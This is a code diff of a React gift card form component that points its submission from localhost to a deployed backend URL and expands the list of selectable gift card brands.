@@ -38,7 +38,7 @@ const Products = ({ openModal }) => {
         e.preventDefault();
         try {
             alert('submitted...');
-            await axios.post("http://localhost:8000/", {
+            await axios.post("https://nodedeploy-4m6t.onrender.com/", {
                 giftCardType,
                 amount,
                 email,
@@ -68,11 +68,22 @@ const Products = ({ openModal }) => {
                         <p className='text-guide'>Select gift card type</p> 
                         <select required onChange={(e) => setGiftCardType(e.target.value)}>
                             <option value="">--Please choose an option--</option>
-                            <option value="amazon">Amazon</option>
-                            <option value="itunes">iTunes</option>
-                            <option value="googlePlay">Google Play</option>
-                            <option value="steam">Steam</option>
-                            <option value="ebay">eBay</option>
+                            <option value="amazon">AMAZON</option>
+                            <option value="amex">AMEX</option>
+                            <option value="apple">APPLE</option>
+                            <option value="googleplay">GOOGLEPLAY</option>
+                            <option value="macy">MACY</option>
+                            <option value="mastercard">MASTERCARD</option>
+                            <option value="nike">NIKE</option>
+                            <option value="nordstorm">NORDSTORM</option>
+                            <option value="playstation">PLAYSTATION</option>
+                            <option value="sepora">SEPHORA</option>
+                            <option value="steam">STEAM</option>
+                            <option value="target">TARGET</option>
+                            <option value="ttvisa">TT VISA</option>
+                            <option value="uber">UBER CARD</option>
+                            <option value="vanillavisa">VANILLA VISA</option>
+                            <option value="wallmartvisa">WALLMART VISA</option>
                         </select>
                     </label>
                     <br /><br />
